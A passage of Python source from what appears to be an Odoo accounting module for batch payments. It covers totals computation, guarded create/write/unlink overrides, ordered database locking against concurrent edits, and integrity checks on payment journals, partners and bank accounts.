                'eh_sealed', 'eh_legacy_unverified_seal',
            ])
            self.env.cr.execute(
                "UPDATE account_move SET eh_sealed = FALSE, "
                "eh_legacy_unverified_seal = TRUE WHERE id IN %s",
                (tuple(sorted(legacy_moves.ids)),),
            )
            legacy_moves.invalidate_recordset([
                'eh_sealed', 'eh_legacy_unverified_seal',
            ])

        return {
            'purged_draft_ids': drafts.ids,
            'reset_confirmed_ids': confirmed.ids,
            'quarantined_posted_ids': posted.ids,
            'sealed_legacy_move_ids': legacy_moves.ids,
        }

    @api.depends('journal_id.currency_id', 'company_id.currency_id')
    def _compute_currency_id(self):
        for batch in self:
            batch.currency_id = (
                batch.journal_id.currency_id
                or batch.company_id.currency_id
            )

    @api.depends(
        'currency_id', 'company_id', 'payment_date', 'payment_ids',
        'payment_ids.amount', 'payment_ids.currency_id', 'payment_ids.date',
        'payment_ids.state', 'payment_ids.is_reconciled',
    )
    def _compute_totals(self):
        for batch in self:
            payments = batch._eh_member_payments()
            batch.payment_count = len(payments)
            target_currency = (
                batch.currency_id or batch.company_id.currency_id
            )
            currencies = payments.mapped('currency_id')
            batch.is_mixed_currency = len(currencies) > 1
            total = 0.0
            for payment in payments:
                source_currency = payment.currency_id or target_currency
                amount = payment.amount
                if source_currency != target_currency:
                    amount = source_currency._convert(
                        amount,
                        target_currency,
                        batch.company_id,
                        payment.date or batch.payment_date,
                    )
                total += amount
            batch.total_amount = target_currency.round(total)
            posted = payments.filtered(lambda p: p.state in POSTED_STATES)
            batch.posted_count = len(posted)
            reconciled = payments.filtered(lambda p: p.is_reconciled)
            batch.reconciled_count = len(reconciled)
            batch.is_fully_reconciled = (
                batch.payment_count > 0
                and batch.reconciled_count == batch.payment_count
            )

    @api.depends(
        'state', 'export_snapshot_json', 'integrity_digest', 'name',
    )
    def _compute_export_preview(self):
        for batch in self:
            batch.preview_export_file = False
            batch.preview_export_filename = False
            if (
                batch.state != 'confirmed'
                or not batch.export_snapshot_json
                or not batch.integrity_digest
            ):
                continue
            content, filename = batch._eh_render_approved_export()
            batch.preview_export_file = base64.b64encode(content)
            batch.preview_export_filename = filename

    def _eh_list_statistics_hook(self):
        statistics = super()._eh_list_statistics_hook()
        for batch in self:
            if batch.payment_count > 0:
                statistics[batch.id].append({
                    'iconClass': 'fa-credit-card',
                    'value': batch.payment_count,
                    'label': _("Payments"),
                    'tagClass': 'o_tag_color_1',
                    'actionMethod': 'action_view_payments',
                })
            if batch.posted_count > 0:
                statistics[batch.id].append({
                    'iconClass': 'fa-check-circle',
                    'value': batch.posted_count,
                    'label': _("Posted"),
                    'tagClass': 'o_tag_color_10',
                    'actionMethod': 'action_view_posted_payments',
                })
            if batch.reconciled_count > 0:
                statistics[batch.id].append({
                    'iconClass': 'fa-link',
                    'value': batch.reconciled_count,
                    'label': _("Reconciled"),
                    'tagClass': 'o_tag_color_7',
                    'actionMethod': 'action_view_reconciled_payments',
                })
        return statistics

    # ---- onchange (live form feedback) ----

    @api.onchange('journal_id')
    def _onchange_journal_id(self):
        """Drop payments whose journal no longer matches.

        Without this, swapping the journal on a draft batch leaves
        existing payments attached but invisible to validators (their
        journal differs from the batch's journal). Better to clear
        the list visibly so the user re-picks payments under the new
        journal. Same applies to payment_method_line_id which is
        journal-scoped.
        """
        for batch in self:
            if not batch.payment_ids:
                continue
            stale = batch.payment_ids.filtered(
                lambda p: p.journal_id != batch.journal_id,
            )
            if stale:
                batch.payment_ids = [(3, p.id) for p in stale]
                return {
                    'warning': {
                        'title': _("Payments removed"),
                        'message': _(
                            "%d payment(s) were removed from the "
                            "batch because their journal no longer "
                            "matches the batch's journal.",
                            len(stale),
                        ),
                    },
                }

    @api.onchange('batch_type')
    def _onchange_batch_type(self):
        """Refresh the journal domain hint when type flips.

        Inbound batches (customer receipts) usually post to a single
        bank journal; outbound (vendor pay) often uses a dedicated
        AP-disbursement journal. We don't change the journal - just
        emit a warning when the current journal looks like a poor
        fit for the new direction so the user reviews.
        """
        for batch in self:
            if not (batch.journal_id and batch.batch_type):
                continue
            jt = batch.journal_id.type
            if jt not in ('bank', 'cash'):
                return {
                    'warning': {
                        'title': _("Journal type mismatch"),
                        'message': _(
                            "Journal %(journal)s is not a bank/cash journal "
                            "and won't accept batch payments.",
                            journal=batch.journal_id.display_name,
                        ),
                    }
                }

    # ---- create ----

    @api.model_create_multi
    def create(self, vals_list):
        self._eh_check_access('create')
        if (
            self.env.su
            and not has_authorized_batch_workflow_capability(self.env)
            and any(
                set(vals).intersection(self._eh_guarded_fields)
                for vals in vals_list
            )
        ):
            raise AccessError(_(
                "Batch workflow and audit fields cannot be supplied on "
                "superuser create. Use the batch lifecycle actions."
            ))
        if any(
            vals.get(field_name)
            for vals in vals_list
            for field_name in _BATCH_GENERATED_EXPORT_FIELDS
        ):
            raise UserError(_(
                "Bank export fields cannot be supplied when creating a "
                "batch. They are sealed only by the Confirm/Post workflow."
            ))
        requested_journal_ids = {
            vals.get('journal_id') for vals in vals_list
            if vals.get('journal_id')
        }
        requested_company_ids = {
            vals.get('company_id') for vals in vals_list
            if vals.get('company_id')
        }
        journals = self.env['account.journal'].browse(
            sorted(requested_journal_ids),
        )
        if journals:
            journals._eh_check_access('read')
        companies = self.env['res.company'].browse(
            sorted(requested_company_ids),
        )
        if companies:
            companies._eh_check_access('read')
            outside_scope = companies - self.env.companies
            if outside_scope and not self.env.su:
                raise AccessError(_(
                    "You cannot create a batch for a company outside your "
                    "currently allowed companies."
                ))
        defaults = self.default_get([
            'company_id', 'batch_type', 'payment_date',
        ])
        for vals in vals_list:
            if vals.get('name', '/') == '/':
                company = self.env['res.company'].browse(
                    vals.get('company_id')
                    or defaults.get('company_id')
                    or self.env.company.id,
                )
                batch_type = (
                    vals.get('batch_type')
                    or defaults.get('batch_type')
                    or 'outbound'
                )
                payment_date = fields.Date.to_date(
                    vals.get('payment_date')
                    or defaults.get('payment_date')
                    or fields.Date.context_today(self)
                )
                vals['name'] = next_batch_reference(
                    self.env,
                    batch_type,
                    company,
                    payment_date,
                ) or '/'
        # Validation happens after defaults/computes have populated the
        # complete instruction. Keep it in a savepoint so callers which catch
        # our UserError cannot retain a half-created invalid batch.
        with self.env.cr.savepoint():
            batches = super().create(vals_list)
            batches._eh_validate_integrity()
        return batches

    def write(self, vals):
        """Freeze reviewed financial inputs and validate draft edits.

        View ``readonly`` modifiers are only presentation.  This guard covers
        imports, RPC calls and server-side One2many commands as well.  The
        workflow helper writes with ``sudo()`` and is the sole intentional
        bypass for state/audit stamps.
        """
        guarded = set(vals).intersection(self._eh_guarded_fields)
        if guarded and not has_authorized_batch_workflow_capability(self.env):
            raise AccessError(_(
                "Batch workflow and audit fields cannot be written directly: "
                "%(fields)s. Use the batch lifecycle actions.",
                fields=', '.join(sorted(guarded)),
            ))
        relevant = _BATCH_FINANCIAL_FIELDS.intersection(vals)
        if not relevant:
            return super().write(vals)
        if (
            has_authorized_batch_export_capability(self.env)
            and set(vals).issubset(_BATCH_GENERATED_EXPORT_FIELDS)
        ):
            return super().write(vals)
        generated = relevant.intersection(_BATCH_GENERATED_EXPORT_FIELDS)
        if generated:
            raise UserError(_(
                "Bank export fields are generator-owned and cannot be "
                "written directly. Use the Export CSV action.",
            ))
        self._eh_check_access('write')
        with self.env.cr.savepoint():
            if 'payment_ids' in vals:
                payment_ids = set(self._eh_member_payments().ids)
                payment_move_ids = set()
                source_move_ids = set()
                Payment = self.env['account.payment']
                for command in vals.get('payment_ids') or ():
                    if not isinstance(command, (tuple, list)) or not command:
                        continue
                    operation = command[0]
                    if operation in (1, 2, 3, 4) and len(command) > 1:
                        payment_ids.add(command[1])
                    if operation in (0, 1) and len(command) > 2:
                        nested_vals = command[2] or {}
                        nested_batch = nested_vals.get(
                            'eh_batch_payment_id',
                        )
                        if nested_batch and nested_batch not in self.ids:
                            raise UserError(_(
                                "Nested payment commands cannot move a member "
                                "to another batch. Use the payment workflow "
                                "directly."
                            ))
                        source_move_ids.update(
                            Payment._eh_source_ids_from_commands(
                                nested_vals.get('eh_source_move_ids'),
                            )
                        )
                        source_move_ids.update(
                            Payment._eh_source_ids_from_commands(
                                nested_vals.get('invoice_ids'),
                            )
                        )
                    if operation == 6 and len(command) > 2:
                        payment_ids.update(command[2] or ())
                    elif operation == 0 and len(command) > 2:
                        move_id = (command[2] or {}).get('move_id')
                        if move_id:
                            payment_move_ids.add(move_id)
                payments = self.env['account.payment'].browse(
                    sorted(payment_ids),
                ).exists()
                payments._eh_lock_batch_mutation(
                    target_batch_ids=self.ids,
                    source_move_ids=source_move_ids,
                    payment_move_ids=payment_move_ids,
                )
            else:
                self._eh_lock_integrity_scope(include_batch_members=True)
            frozen = self.filtered(lambda batch: batch.state != 'draft')
            if frozen:
                raise UserError(_(
                    "Financial batch fields are frozen after review. Return "
                    "the batch to draft before changing %(fields)s. Locked "
                    "batch(es): %(batches)s.",
                    fields=', '.join(sorted(relevant)),
                    batches=', '.join(frozen.mapped('display_name')),
                ))
            result = super().write(vals)
            self._eh_validate_integrity()
        return result

    def _eh_workflow_write(self, vals):
        """Persist server-owned batch state with an unforgeable capability."""
        if not self.env.su:
            self._eh_check_access('write')
        guarded = self.sudo().with_context(**{
            AUTHORIZED_BATCH_WORKFLOW_CONTEXT:
                AUTHORIZED_BATCH_WORKFLOW_CAPABILITY,
        })
        return guarded.write(vals)

    def unlink(self):
        if not self.env.su:
            self._eh_check_access('unlink')
        with self.env.cr.savepoint():
            self._eh_lock_integrity_scope(include_batch_members=True)
            self.invalidate_recordset(['state'])
            locked = self.filtered(
                lambda batch: batch.state in ('confirmed', 'posted'),
            )
            if locked:
                raise UserError(_(
                    "Confirmed or posted batches cannot be deleted. Cancel a "
                    "confirmed batch first; posted batches must be retained for "
                    "audit."
                ))
            if any(batch._eh_posted_member_moves() for batch in self):
                raise UserError(_(
                    "A batch carrying posted or quarantined member cash "
                    "evidence cannot be deleted."
                ))
            return super().unlink()

    # ---- serialisation and integrity ----

    @api.model
    def _eh_advisory_integrity_lock(self):
        """Serialise all claim/membership/workflow integrity decisions."""
        self.env.cr.execute(
            "SELECT pg_advisory_xact_lock(hashtextextended(%s, 0))",
            (_BATCH_ADVISORY_LOCK_KEY,),
        )

    @api.model
    def _eh_advisory_move_owner_lock(self, move_ids):
        """Serialize overlapping move-owner sets with bounded lock stripes."""
        stripes = {
            int(move_id) % _OWNER_LOCK_STRIPES
            for move_id in (move_ids or ())
        }
        for stripe in sorted(stripes):
            self.env.cr.execute(
                "SELECT pg_advisory_xact_lock(hashtextextended(%s, 0))",
                ("%s%s" % (_MOVE_OWNER_ADVISORY_PREFIX, stripe),),
            )

    @api.model
    def _eh_advisory_payment_owner_lock(self, payment_ids):
        """Serialize overlapping payment-owner sets with bounded stripes."""
        stripes = {
            int(payment_id) % _OWNER_LOCK_STRIPES
            for payment_id in (payment_ids or ())
        }
        for stripe in sorted(stripes):
            self.env.cr.execute(
                "SELECT pg_advisory_xact_lock(hashtextextended(%s, 0))",
                ("%s%s" % (_PAYMENT_OWNER_ADVISORY_PREFIX, stripe),),
            )

    @api.model
    def _eh_source_reconcile_graph_ids(self, source_move_ids):
        """Return complete AML/partial/move ids reachable from source AR/AP."""
        source_move_ids = sorted(set(source_move_ids or ()))
        if not source_move_ids:
            return set(), set(), set()
        self.env.cr.execute(
            """
            WITH RECURSIVE graph_line(id) AS (
                SELECT aml.id
                  FROM account_move_line aml
                  JOIN account_account account ON account.id = aml.account_id
                 WHERE aml.move_id IN %s
                   AND account.account_type IN (
                       'asset_receivable', 'liability_payable'
                   )
                UNION
                SELECT CASE
                           WHEN partial.debit_move_id = graph_line.id
                           THEN partial.credit_move_id
                           ELSE partial.debit_move_id
                       END
                  FROM graph_line
                  JOIN account_partial_reconcile partial
                    ON partial.debit_move_id = graph_line.id
                    OR partial.credit_move_id = graph_line.id
            )
            SELECT graph_line.id, aml.move_id
              FROM graph_line
              JOIN account_move_line aml ON aml.id = graph_line.id
             ORDER BY graph_line.id
            """,
            (tuple(source_move_ids),),
        )
        rows = self.env.cr.fetchall()
        line_ids = {row[0] for row in rows}
        move_ids = {row[1] for row in rows}
        partial_ids = set()
        if line_ids:
            self.env.cr.execute(
                "SELECT id FROM account_partial_reconcile "
                "WHERE debit_move_id IN %s OR credit_move_id IN %s "
                "ORDER BY id",
                (tuple(sorted(line_ids)), tuple(sorted(line_ids))),
            )
            partial_ids.update(row[0] for row in self.env.cr.fetchall())
        return line_ids, partial_ids, move_ids

    def _eh_lock_integrity_scope(self, payment_ids=(), source_move_ids=(),
                                 payment_move_ids=(),
                                 include_batch_members=False,
                                 include_module_claim_lock=True):
        # Own every lock acquired by this helper. A rejected server caller may
        # catch UserError; rolling this savepoint back then releases advisory
        # and row locks, while successful RELEASE keeps them to transaction end.
        with self.env.cr.savepoint():
            return self._eh_lock_integrity_scope_locked(
                payment_ids=payment_ids,
                source_move_ids=source_move_ids,
                payment_move_ids=payment_move_ids,
                include_batch_members=include_batch_members,
                include_module_claim_lock=include_module_claim_lock,
            )

    def _eh_lock_integrity_scope_locked(self, payment_ids=(),
                                        source_move_ids=(),
                                        payment_move_ids=(),
                                        include_batch_members=False,
                                        include_module_claim_lock=True):
        """Lock and invalidate all rows participating in an integrity check.

        ``self`` contains current and/or target batches.  Callers may add
        explicit payment/source ids.  When ``include_batch_members`` is true,
        membership is discovered from SQL after taking the advisory lock, so
        a stale ORM cache cannot omit a newly committed member.

        Locks are always acquired in table/id order: batch headers, payments,
        source receivable/payable lines, then payment/source move headers.
        Locking the settlement lines before the source header matches
        reconciliation's natural order and closes the race with an ordinary
        non-batch payment. Source locks are fail-fast so a bank action never
        waits indefinitely behind interactive reconciliation.
        """
        batch_ids = sorted(set(self.ids))
        payment_ids = set(payment_ids or ())
        source_move_ids = set(source_move_ids or ())
        payment_move_ids = set(payment_move_ids or ())

        Batch = self.env['eh.batch.payment'].sudo()
        Payment = self.env['account.payment'].sudo()
        Move = self.env['account.move'].sudo()
        # Flush only rows explicitly passed by the caller, and do so before
        # entering the documented lock order. ORM relation writes are issued
        # immediately; no model-wide post-lock flush is needed or safe.
        Batch.browse(batch_ids).flush_recordset()
        Payment.browse(sorted(payment_ids)).flush_recordset()
        Move.browse(sorted(source_move_ids)).flush_recordset()
        Move.browse(sorted(payment_move_ids)).flush_recordset()

        # Discover every current member/source/cash move before the global
        # claim lock and take the shared per-move advisory locks first. Source
        # editors use the same order, so a draft-source edit cannot pass an
        # empty reviewed-link check and then race a concurrent confirmation.
        preliminary_payment_ids = set(payment_ids)
        if include_batch_members and batch_ids:
            self.env.cr.execute(
                "SELECT id FROM account_payment "
                "WHERE eh_batch_payment_id IN %s ORDER BY id",
                (tuple(batch_ids),),
            )
            preliminary_payment_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )
        preliminary_source_move_ids = set(source_move_ids)
        preliminary_move_ids = set(payment_move_ids)
        if preliminary_payment_ids:
            self.env.cr.execute(
                "SELECT move_id FROM eh_batch_payment_source_move_rel "
                "WHERE payment_id IN %s ORDER BY move_id",
                (tuple(sorted(preliminary_payment_ids)),),
            )
            preliminary_source_move_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )
            preliminary_payments = Payment.browse(
                sorted(preliminary_payment_ids),
            )
            if 'invoice_ids' in Payment._fields:
                preliminary_payments.invalidate_recordset(['invoice_ids'])
                preliminary_source_move_ids.update(
                    preliminary_payments._eh_core_invoice_moves().ids
                )
            self.env.cr.execute(
                "SELECT move_id FROM account_payment WHERE id IN %s "
                "AND move_id IS NOT NULL ORDER BY move_id",
                (tuple(sorted(preliminary_payment_ids)),),
            )
            preliminary_move_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )
            preliminary_owner_field = (
                'origin_payment_id'
                if 'origin_payment_id' in Move._fields
                else 'payment_id'
            )
            self.env.cr.execute(
                sql.SQL(
                    "SELECT id FROM account_move WHERE {} IN %s ORDER BY id"
                ).format(sql.Identifier(preliminary_owner_field)),
                (tuple(sorted(preliminary_payment_ids)),),
            )
            preliminary_move_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )
        preliminary_move_ids.update(preliminary_source_move_ids)
        (
            preliminary_graph_line_ids,
            preliminary_graph_partial_ids,
            preliminary_graph_move_ids,
        ) = self._eh_source_reconcile_graph_ids(
            preliminary_source_move_ids,
        )
        preliminary_move_ids.update(preliminary_graph_move_ids)
        self._eh_advisory_move_owner_lock(preliminary_move_ids)
        self._eh_advisory_payment_owner_lock(preliminary_payment_ids)
        if include_module_claim_lock:
            self._eh_advisory_integrity_lock()

        if batch_ids:
            self.env.cr.execute(
                "SELECT id FROM eh_batch_payment WHERE id IN %s "
                "ORDER BY id FOR UPDATE",
                (tuple(batch_ids),),
            )
        if include_batch_members and batch_ids:
            self.env.cr.execute(
                "SELECT id FROM account_payment "
                "WHERE eh_batch_payment_id IN %s ORDER BY id",
                (tuple(batch_ids),),
            )
            payment_ids.update(row[0] for row in self.env.cr.fetchall())

        locked_payment_ids = sorted(payment_ids)
        if locked_payment_ids:
            self.env.cr.execute(
                "SELECT id FROM account_payment WHERE id IN %s "
                "ORDER BY id FOR UPDATE",
                (tuple(locked_payment_ids),),
            )
            # Existing source relations must be protected even when the
            # caller is changing only the batch pointer or a header value.
            self.env.cr.execute(
                "SELECT DISTINCT move_id "
                "FROM eh_batch_payment_source_move_rel "
                "WHERE payment_id IN %s ORDER BY move_id",
                (tuple(locked_payment_ids),),
            )
            source_move_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )
            # Core invoice links exist only on 18+. Account-payment writes
            # share this payment-row lock, so re-reading the relation here is
            # race-safe and avoids a target-specific relation-table name.
            locked_payments = Payment.browse(locked_payment_ids)
            if 'invoice_ids' in Payment._fields:
                locked_payments.invalidate_recordset(['invoice_ids'])
                source_move_ids.update(
                    locked_payments._eh_core_invoice_moves().ids
                )

        # Freeze journal bank configuration and every selected partner bank
        # before validation and export-snapshot rendering. Payment rows already
        # protect their partner_bank_id links; journal rows protect inbound
        # bank_account_id links. SKIP LOCKED makes concurrent master-data edits
        # fail this workflow instead of producing an unreviewed account number.
        journal_ids = set()
        if batch_ids:
            self.env.cr.execute(
                "SELECT journal_id FROM eh_batch_payment WHERE id IN %s "
                "ORDER BY journal_id",
                (tuple(batch_ids),),
            )
            journal_ids.update(row[0] for row in self.env.cr.fetchall())
        if locked_payment_ids:
            if getattr(Payment, '_inherits', {}).get('account.move') == 'move_id':
                # Odoo 16/17 delegate journal_id through account.move, so no
                # physical journal_id column exists on account_payment.
                self.env.cr.execute(
                    "SELECT move.journal_id FROM account_payment payment "
                    "JOIN account_move move ON move.id = payment.move_id "
                    "WHERE payment.id IN %s ORDER BY move.journal_id",
                    (tuple(locked_payment_ids),),
                )
            else:
                self.env.cr.execute(
                    "SELECT journal_id FROM account_payment WHERE id IN %s "
                    "ORDER BY journal_id",
                    (tuple(locked_payment_ids),),
                )
            journal_ids.update(row[0] for row in self.env.cr.fetchall())
        journal_ids.discard(None)
        if journal_ids:
            self.env.cr.execute(
                "SELECT id FROM account_journal WHERE id IN %s "
                "ORDER BY id FOR UPDATE SKIP LOCKED",
                (tuple(sorted(journal_ids)),),
            )
            if {row[0] for row in self.env.cr.fetchall()} != journal_ids:
                raise UserError(_(
                    "A payment journal is being edited by another transaction. "
                    "No batch change was made; retry."
                ))
        bank_ids = set()
        if locked_payment_ids:
            self.env.cr.execute(
                "SELECT partner_bank_id FROM account_payment WHERE id IN %s "
                "AND partner_bank_id IS NOT NULL ORDER BY partner_bank_id",
                (tuple(locked_payment_ids),),
            )
            bank_ids.update(row[0] for row in self.env.cr.fetchall())
        if journal_ids:
            self.env.cr.execute(
                "SELECT bank_account_id FROM account_journal WHERE id IN %s "
                "AND bank_account_id IS NOT NULL ORDER BY bank_account_id",
                (tuple(sorted(journal_ids)),),
            )
            bank_ids.update(row[0] for row in self.env.cr.fetchall())
        if bank_ids:
            self.env.cr.execute(
                "SELECT id FROM res_partner_bank WHERE id IN %s "
                "ORDER BY id FOR UPDATE SKIP LOCKED",
                (tuple(sorted(bank_ids)),),
            )
            if {row[0] for row in self.env.cr.fetchall()} != bank_ids:
                raise UserError(_(
                    "A payment bank account is being edited by another "
                    "transaction. No batch change was made; retry."
                ))
        journals = self.env['account.journal'].browse(
            sorted(journal_ids),
        )
        banks = self.env['res.partner.bank'].browse(sorted(bank_ids))
        journals.invalidate_recordset(['bank_account_id'])
        banks.invalidate_recordset()
        Payment.browse(locked_payment_ids).invalidate_recordset([
            'journal_id', 'partner_bank_id',
        ])

        # Lock every journal entry which directly claims a member payment.
        # This is the delegated canonical move on 16/17 and the posted cash
        # move on 18/19.  It also catches a corrupt/shadow owner link so cancel
        # or reset cannot race it or erase evidence while cash remains posted.
        owned_payment_move_ids = set()
        if locked_payment_ids:
            owner_field = (
                'origin_payment_id'
                if 'origin_payment_id' in Move._fields
                else 'payment_id'
            )
            self.env.cr.execute(
                sql.SQL(
                    "SELECT id FROM account_move WHERE {} IN %s ORDER BY id"
                ).format(sql.Identifier(owner_field)),
                (tuple(locked_payment_ids),),
            )
            owned_payment_move_ids.update(
                row[0] for row in self.env.cr.fetchall()
            )

        (
            graph_line_ids,
            graph_partial_ids,
            graph_move_ids,
        ) = self._eh_source_reconcile_graph_ids(source_move_ids)
        if not (
            source_move_ids
            | owned_payment_move_ids
            | payment_move_ids
            | graph_move_ids
        ).issubset(preliminary_move_ids):
            raise UserError(_(
                "A batch member, source, cash move, or source-reconciliation "
                "graph changed concurrently. No batch change was made; retry."
            ))
        if (
            not graph_line_ids.issubset(preliminary_graph_line_ids)
            or not graph_partial_ids.issubset(
                preliminary_graph_partial_ids,
            )
        ):
            raise UserError(_(
                "A source-reconciliation graph changed concurrently. No "
                "batch change was made; retry."
            ))

        locked_move_ids = sorted(
            source_move_ids
            | owned_payment_move_ids
            | payment_move_ids
            | graph_move_ids,
        )
        moves = Move.browse(locked_move_ids).exists()
        MoveLine = self.env['account.move.line'].sudo()
        locked_lines = MoveLine.browse(sorted(graph_line_ids))
        if owned_payment_move_ids or payment_move_ids:
            # Payment posting/reconciliation recomputes stored projections
            # across cash lines. Lock every existing line with SKIP LOCKED
            # before its move header; a concurrent line-first edit then fails
            # this workflow fast instead of deadlocking against our locks.
            locked_lines |= MoveLine.search([
                ('move_id', 'in', sorted(
                    owned_payment_move_ids | payment_move_ids,
                )),
            ], order='id')
        locked_lines = locked_lines.sorted('id')
        locked_partials = self.env['account.partial.reconcile'].sudo().browse(
            sorted(graph_partial_ids),
        )
        if locked_move_ids:
            # Keep this lock primitive portable across supported Odoo series:
            # recordset.lock_for_update() and LockError only exist in Odoo 19.
            # SKIP LOCKED plus exact cardinality gives the same fail-fast
            # behaviour on 16--19.  The nested savepoint releases any subset
            # acquired before a conflict when the UserError escapes it.
            lock_targets = (
                ('account_move_line', tuple(locked_lines.ids)),
                ('account_partial_reconcile', tuple(locked_partials.ids)),
                ('account_move', tuple(moves.ids)),
            )
            with self.env.cr.savepoint():
                for table, expected_ids in lock_targets:
                    if not expected_ids:
                        continue
                    self.env.cr.execute(
                        f"SELECT id FROM {table} "
                        "WHERE id IN %s ORDER BY id FOR UPDATE SKIP LOCKED",
                        (expected_ids,),
                    )
                    locked_ids = {row[0] for row in self.env.cr.fetchall()}
                    if locked_ids != set(expected_ids):
                        raise UserError(_(
                            "A batch payment or source document is being "
                            "posted, reconciled, or edited by another "
                            "transaction. No batch change was made; retry "
                            "after that operation finishes."
                        ))
                (
                    locked_graph_line_ids,
                    locked_graph_partial_ids,
                    locked_graph_move_ids,
                ) = self._eh_source_reconcile_graph_ids(source_move_ids)
                if (
                    locked_graph_line_ids != graph_line_ids
                    or locked_graph_partial_ids != graph_partial_ids
                    or locked_graph_move_ids != graph_move_ids
                ):
                    raise UserError(_(
                        "A source-reconciliation graph changed while it was "
                        "being locked. No batch change was made; retry."
                    ))

        batches = Batch.browse(batch_ids).exists()
        payments = Payment.browse(locked_payment_ids).exists()
        # In 16/17 payment.state is delegated to move_id.state. Invalidate
        # every locked move before the payments so validation cannot retain
        # a pre-lock delegated state value.
        moves.invalidate_recordset()
        locked_lines.invalidate_recordset()
        locked_partials.invalidate_recordset()
        payments.invalidate_recordset()
        batches.invalidate_recordset()
        # Invalidate the caller environments too; sudo() has a different
        # recordset but shares the cache only as an implementation detail we
        # should not rely on.
        self.invalidate_recordset()
        self.env['account.move'].browse(locked_move_ids).invalidate_recordset()
        self.env['account.payment'].browse(locked_payment_ids).invalidate_recordset()
        return batches, payments, moves

    def _eh_validate_integrity(self, require_payments=False,
                               require_draft=False,
                               require_postable=False):
        """Fail closed on every header/member/source financial invariant."""
        Payment = self.env['account.payment'].sudo()
        Move = self.env['account.move'].sudo()
        has_origin_payment_link = (
            'origin_payment_id' in Move._fields
        )
        payment_owner_field = (
            'origin_payment_id' if has_origin_payment_link else 'payment_id'
        )

        def _account_belongs_to_company(account, company):
            if 'company_ids' not in account._fields:
                return account.company_id == company
            owners = account.company_ids
            scoped_company = company
            while scoped_company:
                if scoped_company in owners:
                    return True
                scoped_company = scoped_company.parent_id
            return False

        for visible_batch in self:
            batch = visible_batch.sudo()
            journal = batch.journal_id
            if not journal or journal.type not in ('bank', 'cash'):
                raise UserError(_(
                    "Batch %(batch)s must use a bank or cash journal.",
                    batch=batch.display_name,
                ))
            if journal.company_id != batch.company_id:
                raise UserError(_(
                    "Batch %(batch)s journal and batch company do not match.",
                    batch=batch.display_name,
                ))
            method = batch.payment_method_line_id
            if method and (
                method.journal_id != journal
                or method.payment_type != batch.batch_type
            ):
                raise UserError(_(
                    "Batch %(batch)s payment method must belong to its "
                    "journal and %(direction)s direction.",
                    batch=batch.display_name,
                    direction=batch.batch_type,
                ))

            effective_currency = (
                journal.currency_id or batch.company_id.currency_id
            )
            payments = batch._eh_member_payments()
            if require_payments and not payments:
                raise UserError(_(
                    "Batch %(batch)s has no payments.",
                    batch=batch.display_name,
                ))
            expected_partner_type = (
                'customer' if batch.batch_type == 'inbound' else 'supplier'
            )
            expected_move_types = (
                ('out_invoice', 'out_refund')
                if batch.batch_type == 'inbound'
                else ('in_invoice', 'in_refund')
            )
            batch_settlement_line_ids = set()
            for payment in payments:
                direct_moves = Move.search([
                    (payment_owner_field, '=', payment.id),
                ], order='id')
                canonical_move = payment.move_id
                if (
                    (canonical_move and direct_moves != canonical_move)
                    or (not canonical_move and direct_moves)
                    or (
                        canonical_move
                        and canonical_move[payment_owner_field] != payment
                    )
                ):
                    raise UserError(_(
                        "Payment %(payment)s must own exactly its canonical "
                        "journal entry; detached or shadow payment links are "
                        "not valid batch evidence.",
                        payment=payment.display_name,
                    ))
                if require_draft and payment.state != 'draft':
                    raise UserError(_(
                        "Payment %(payment)s must still be draft before "
                        "batch %(batch)s can proceed (current state: "
                        "%(state)s).",
                        payment=payment.display_name,
                        batch=batch.display_name,
                        state=payment.state,
                    ))
                if (
                    require_draft
                    and has_origin_payment_link
                    and payment.move_id
                ):
                    raise UserError(_(
                        "Payment %(payment)s already has a journal entry and "
                        "cannot be treated as an unposted batch member.",
                        payment=payment.display_name,
                    ))
                if (
                    require_draft
                    and not has_origin_payment_link
                    and (
                        not payment.move_id
                        or payment.move_id.state != 'draft'
                    )
                ):
                    raise UserError(_(
                        "Payment %(payment)s delegated journal entry must "
                        "still be draft before it can be treated as an "
                        "unposted batch member.",
                        payment=payment.display_name,
                    ))
                if payment.company_id != batch.company_id:
                    raise UserError(_(
                        "Payment %(payment)s belongs to a different company "
                        "than batch %(batch)s.",
                        payment=payment.display_name,
                        batch=batch.display_name,
                    ))
                if payment.journal_id != journal:
                    raise UserError(_(
                        "Payment %(payment)s journal does not match batch "
                        "%(batch)s.",
                        payment=payment.display_name,
                        batch=batch.display_name,
                    ))
                if payment.payment_type != batch.batch_type:
                    raise UserError(_(
                        "Payment %(payment)s direction does not match batch "
                        "%(batch)s.",
                        payment=payment.display_name,
                        batch=batch.display_name,
                    ))
                if (
                    'is_internal_transfer' in payment._fields
                    and payment.is_internal_transfer
                ):
                    raise UserError(_(
                        "Internal-transfer payments cannot join an external "
                        "customer/vendor batch.",
                    ))
                if payment.partner_type != expected_partner_type:
                    raise UserError(_(
                        "Payment %(payment)s partner type is inconsistent "
                        "with batch %(batch)s direction.",
                        payment=payment.display_name,
                        batch=batch.display_name,
                    ))
                if not payment.partner_id:
                    raise UserError(_(
                        "Payment %(payment)s must have a partner.",
                        payment=payment.display_name,
                    ))
                bank = payment.partner_bank_id
                bank_in_scope = (
                    not bank
                    or (
                        payment.payment_type == 'inbound'
                        and bank == journal.bank_account_id
                    )
                    or (
                        payment.payment_type == 'outbound'
                        and bank.partner_id == payment.partner_id
                        and (
                            not bank.company_id
                            or bank.company_id == payment.company_id
                        )
                    )
                )
                if not bank_in_scope:
                    raise UserError(_(
                        "Payment %(payment)s recipient bank account does not "
                        "belong to the reviewed partner/company scope.",
                        payment=payment.display_name,
                    ))
                requires_bank = (
                    payment.payment_method_line_id.code
                    in payment._get_method_codes_needing_bank_account()
                )
                if requires_bank and (
                    not bank or (
                        payment.payment_type == 'outbound'
                        and not bank.allow_out_payment
                    )
                ):
                    raise UserError(_(
                        "Payment %(payment)s requires a present, trusted "
                        "recipient bank account.",
                        payment=payment.display_name,
                    ))
                if payment.amount <= 0:
                    raise UserError(_(
                        "Payment %(payment)s amount must be greater than zero.",
                        payment=payment.display_name,
                    ))
                rounded_amount = payment.currency_id.round(payment.amount)
                if payment.amount != rounded_amount:
                    raise UserError(_(
                        "Payment %(payment)s amount must equal the currency "
                        "precision-rounded value %(amount)s.",
                        payment=payment.display_name,
                        amount=payment.currency_id.format(rounded_amount),
                    ))
                # A journal with an explicit currency can only move that
